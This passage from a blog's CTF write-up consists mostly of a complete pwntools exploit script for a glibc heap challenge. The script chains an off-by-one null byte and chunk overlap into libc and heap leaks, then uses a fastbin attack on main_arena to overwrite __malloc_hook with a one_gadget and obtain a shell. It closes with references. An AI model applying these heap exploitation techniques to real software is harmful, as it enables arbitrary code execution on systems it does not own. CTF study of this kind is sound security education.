 b5 = alloc(<span class="number">0x58</span>) <span class="comment">#5 fastbin  0x240</span></span><br><span class="line">    b6 = alloc(<span class="number">0x58</span>) <span class="comment">#6 fastbin  0x2a0</span></span><br><span class="line">    c = alloc(<span class="number">0x58</span>) <span class="comment">#7 fastbin  0x300</span></span><br><span class="line">    <span class="comment"># prepare fake chunk c.prev_size = 0x200</span></span><br><span class="line">    update(<span class="number">7</span>, <span class="number">0x48</span>, <span class="string">'\x00'</span>*<span class="number">0x40</span>+p64(<span class="number">0x200</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># put them in fastbin to wait for consolidate</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">7</span>):</span><br><span class="line">            delete(i)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strain_and_prepare</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># fill tcache to comsume top chunk size</span></span><br><span class="line">    <span class="keyword">for</span> size <span class="keyword">in</span> [<span class="number">0x58</span>, <span class="number">0x48</span>, <span class="number">0x38</span>]:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">            _id = alloc(size)</span><br><span class="line">            update(_id, size, <span class="string">'a'</span>*size)</span><br><span class="line">            delete(_id)</span><br><span class="line"></span><br><span class="line">    size = <span class="number">0x28</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>): <span class="comment"># fill tcache</span></span><br><span class="line">        _id = alloc(size)</span><br><span class="line">        delete(_id)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        _id = alloc(size)</span><br><span class="line">        update(_id, size, <span class="string">'a'</span>*size)</span><br><span class="line">        delete(_id)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># now top_chunk-&gt;size = 0x100</span></span><br><span class="line">    prepare_fastbin()</span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">0x48</span>) <span class="comment">#0</span></span><br><span class="line">    alloc(<span class="number">0x48</span>) <span class="comment">#1</span></span><br><span class="line">    alloc(<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">strain_and_prepare()</span><br><span class="line"><span class="comment"># now top_chunk-&gt;size = 0x30</span></span><br><span class="line"><span class="comment"># we can alloc any size &gt;= 0x30 to trigger consolidate</span></span><br><span class="line">off_by_one_chunk = alloc(<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># now off_by_one_chunk(0x28) is at 0x87a0, a small bin (0x210) at 0x87c0</span></span><br><span class="line"><span class="comment"># we can off-by-one to set small bin chunk to 0x200.</span></span><br><span class="line">update(off_by_one_chunk, <span class="number">0x28</span>, <span class="string">'a'</span>*<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">a = alloc(<span class="number">0x58</span>) <span class="comment"># fastbin</span></span><br><span class="line">b1 = alloc(<span class="number">0x58</span>) <span class="comment"># in_used </span></span><br><span class="line">b2 = alloc(<span class="number">0x58</span>) <span class="comment"># in_used </span></span><br><span class="line">b3 = alloc(<span class="number">0x58</span>) <span class="comment"># in_used </span></span><br><span class="line">b4 = alloc(<span class="number">0x58</span>) <span class="comment"># fastbin </span></span><br><span class="line">c = <span class="number">7</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># push in fastbin</span></span><br><span class="line">update(a, <span class="number">0x51</span>, <span class="string">'a'</span>*<span class="number">0x50</span> + p8(<span class="number">0x60</span>)) <span class="comment"># put a fake chunk size to bypass check</span></span><br><span class="line">delete(c)</span><br><span class="line">delete(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger consolidate</span></span><br><span class="line">alloc(<span class="number">0x30</span>)</span><br><span class="line"><span class="comment"># [OVERLAP] now [b1, b2, b3, b4] in used but also in unsortbin</span></span><br><span class="line">victim = alloc(<span class="number">0x58</span>)</span><br><span class="line"><span class="comment"># b1[0x58]: 0x555555578830, </span></span><br><span class="line"><span class="comment"># victim[0x58]: 0x555555578810 overlap</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">view(b1)</span><br><span class="line">ru(<span class="string">': '</span>)</span><br><span class="line">leak = ru(<span class="string">'\n'</span>)</span><br><span class="line">leak_libc = u64(leak[<span class="number">0x40</span>: <span class="number">0x48</span>])</span><br><span class="line">info_addr(<span class="string">'leak_libc'</span>, leak_libc)</span><br><span class="line">libc.address = leak_libc - <span class="number">0x1e4ca0</span></span><br><span class="line">info_addr(<span class="string">'libc'</span>, libc.address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap</span></span><br><span class="line">victim2 = alloc(<span class="number">0x48</span>)</span><br><span class="line">delete(<span class="number">1</span>) <span class="comment"># [0x48]</span></span><br><span class="line">delete(victim2)</span><br><span class="line">view(b1)</span><br><span class="line">ru(<span class="string">': '</span>)</span><br><span class="line">leak = ru(<span class="string">'\n'</span>)</span><br><span class="line">leak_heap = u64(leak[<span class="number">0x40</span>: <span class="number">0x48</span>])</span><br><span class="line">info_addr(<span class="string">'leak_heap'</span>, leak_heap)</span><br><span class="line">heap = leak_heap - <span class="number">0x1fce0</span></span><br><span class="line">info_addr(<span class="string">'heap'</span>, heap)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin attack, get top_chunk at main_arena.</span></span><br><span class="line">delete(<span class="number">4</span>) <span class="comment"># [0x28]</span></span><br><span class="line">arena_target = libc.address + <span class="number">0x1e4c55</span></span><br><span class="line"><span class="comment"># edit victim2-&gt;fd</span></span><br><span class="line">update(b1, <span class="number">0x48</span>, <span class="string">'\x00'</span>*<span class="number">0x38</span> + p64(<span class="number">0x51</span>) + p64(arena_target))</span><br><span class="line">junk = alloc(<span class="number">0x48</span>)</span><br><span class="line">arena_buf = alloc(<span class="number">0x48</span>) </span><br><span class="line"></span><br><span class="line">main_arena = libc.address + <span class="number">0x1e4c40</span></span><br><span class="line">info_addr(<span class="string">"arena"</span>, main_arena)</span><br><span class="line">malloc_hook = libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">info_addr(<span class="string">"malloc hook"</span>, malloc_hook)</span><br><span class="line">new_top = malloc_hook - <span class="number">0x28</span></span><br><span class="line">info_addr(<span class="string">"new top"</span>, new_top)</span><br><span class="line">update(arena_buf, <span class="number">0x43</span>, <span class="string">'\x00'</span>*<span class="number">0x3b</span> + p64(new_top))</span><br><span class="line"></span><br><span class="line"><span class="comment"># consume remain unsortedbin</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    junk = alloc(<span class="number">0x58</span>)</span><br><span class="line">    delete(junk)</span><br><span class="line">    update(arena_buf, <span class="number">0x30</span>, <span class="string">'\x00'</span>*<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">victim = alloc(<span class="number">0x58</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = libc.address + <span class="number">0x501e3</span></span><br><span class="line">jump_gadget = libc.address + <span class="number">0x105ae0</span></span><br><span class="line"></span><br><span class="line">update(victim, <span class="number">0x20</span>, <span class="string">'\x00'</span>*<span class="number">0x10</span> + p64(one_gadget) + p64(jump_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># allocate chunk to trigger one gadget</span></span><br><span class="line">sl(<span class="string">"1"</span>)</span><br><span class="line">sl(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<h2 id="Final-words"><a href="#Final-words" class="headerlink" title="Final words"></a>Final words</h2><p>With this challenage solved, our team ranked at 10th place in risingstar scoreboard. Thanks for @eee and @Oops for all great challenges, really enjoy the game! Wish our team can meet top players in Shanghai!</p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol>
<li><a href="https://bbs.pediy.com/thread-226037.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-226037.htm</a></li>
<li><a href="http://tacxingxing.com/2018/01/24/poison-null-byte/" target="_blank" rel="noopener">http://tacxingxing.com/2018/01/24/poison-null-byte/</a></li>
<li><a href="http://tacxingxing.com/2018/02/20/pwnabletw-secretgarden/" target="_blank" rel="noopener">http://tacxingxing.com/2018/02/20/pwnabletw-secretgarden/</a></li>
<li><a href="https://gist.github.com/unamer/81b55e513d03f8c092d38f839bc0137a" target="_blank" rel="noopener">https://gist.github.com/unamer/81b55e513d03f8c092d38f839bc0137a</a></li>
<li><a href="https://github.com/shellphish/how2heap" target="_blank" rel="noopener">https://github.com/shellphish/how2heap</a></li>
</ol>

      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        

      
    </div>


    <footer class="post-footer">
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/03/19/亲密关系破坏指南-《无敌破坏王2》/" rel="next" title="亲密关系破坏指南--《无敌破坏王2》">
                <i class="fa fa-chevron-left"></i> 亲密关系破坏指南--《无敌破坏王2》
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/04/11/VirtualBox-Exploitation-1/" rel="prev" title="VirtualBox Exploitation #1">
                VirtualBox Exploitation #1 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </article>



    <div class="post-spread">
      
    </div>
  </div>

          
          </div>
          


          
  <div class="comments" id="comments">
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目錄
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            本站概覽
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="Matthew Shao">
          <p class="site-author-name" itemprop="name">Matthew Shao</p>
          <p class="site-description motion-element" itemprop="description">一向年光有限身。酒筵歌席莫辞频。</p>
        </div>
        <nav class="site-state motion-element">
        
          
            <div class="site-state-item site-state-posts">
              <a href="/archives">
                <span class="site-state-item-count">53</span>
                <span class="site-state-item-name">文章</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-categories">
              <a href="/categories">
                <span class="site-state-item-count">2</span>
                <span class="site-state-item-name">分類</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-tags">
              <a href="/tags">
                <span class="site-state-item-count">14</span>
                <span class="site-state-item-name">標籤</span>
              </a>
            </div>
          

        </nav>

        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/MatthewShao" target="_blank" title="Github">
                  
                    <i class="fa fa-fw fa-globe"></i>
                  
                  Github
                </a>
              </span>
            
          
        </div>

        
        

        
        

        


      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Vulnerability-off-by-one-null-byte"><span class="nav-number">1.</span> <span class="nav-text">Vulnerability: off-by-one null byte</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Constrains-and-thoughts"><span class="nav-number">2.</span> <span class="nav-text">Constrains and thoughts</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Small-bin-chunk"><span class="nav-number">3.</span> <span class="nav-text">Small bin chunk</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Posion-Null-Byte"><span class="nav-number">4.</span> <span class="nav-text">Posion Null Byte</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exp-1"><span class="nav-number">5.</span> <span class="nav-text">Exp #1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Better-solution"><span class="nav-number">6.</span> <span class="nav-text">Better solution?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Final-words"><span class="nav-number">7.</span> <span class="nav-text">Final words</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#References"><span class="nav-number">8.</span> <span class="nav-text">References</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Matthew Shao</span>
</div>


<div class="powered-by">
  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 強力驅動
</div>

<div class="theme-info">
  主題 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Logos
  </a>
</div>


        

        
      </div>
    </footer>

    <div class="back-to-top">
      <i class="fa fa-arrow-up"></i>
    </div>
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  




  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>



  
  


  <script type="text/javascript" src="/js/src/schemes/logos.js?v=5.1.0"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>



  



  




	





  





  

  




  
  

  

  

  

  


</body>
</html>
